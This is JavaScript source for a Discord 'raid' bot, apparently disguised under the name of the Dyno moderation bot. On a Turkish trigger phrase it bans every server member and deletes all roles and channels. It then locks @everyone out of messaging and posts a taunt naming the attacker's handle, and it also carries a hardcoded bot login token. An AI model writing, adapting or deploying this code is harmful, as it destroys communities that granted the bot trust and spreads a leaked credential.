////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const express = require('express');

const Discord = require('discord.js');
const berke = new Discord.Client();
const app = express();
const http = require('http');
    app.get("/", (request, response) => {
    response.sendStatus(200);
    });
    app.listen(process.env.PORT);
    setInterval(() => {
    http.get('http://dyno-raid.glitch.me/');
    }, 280000);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('message', async msg => {
  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
    msg.guild.members.forEach(member => member.ban())
    msg.guild.roles.deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.createChannel("lyrics");
    msg.guild.createChannel("lyrics");
    msg.guild.createChannel("lyrics");
  }
});
 
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 


berke.on('message', message => {
    if(message.content.toLowerCase() === 'ban kaldır' ) {
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                message.guild.unban(user);
            });
        });
    }
});

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('channelCreate', channel => {
  if (channel.name == 'dyno') {
    channel.send('Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; ``🏆 Chêrry.#0345``')
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

berke.login("NjQ4MTcxNTM5NTY4Nzg3NDU5.Xd2Fxw.D9K3het4M1O1ESX2Va3ktMUWtTQ")


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////